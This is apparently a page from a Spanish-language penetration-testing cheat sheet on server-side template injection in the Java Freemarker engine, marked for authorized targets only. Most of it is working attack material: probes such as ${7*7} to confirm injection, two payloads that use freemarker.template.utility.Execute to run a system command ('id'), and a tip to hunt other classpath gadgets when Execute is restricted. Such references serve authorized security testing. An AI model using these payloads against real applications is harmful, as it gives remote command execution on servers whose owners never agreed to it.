# SSTI — Freemarker (Java)

Ver índice: [ssti.md](ssti.md). **Solo sobre objetivos autorizados.**

## Confirmar

```
${7*7}   -> 49
${"freemarker"}
```

## Camino a RCE

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

## Notas

- Freemarker usa `${...}` y directivas `<#...>`.
- Si `Execute` está restringido, busca otros gadgets del classpath (según versión/sandbox).
- Demuestra con `id`.
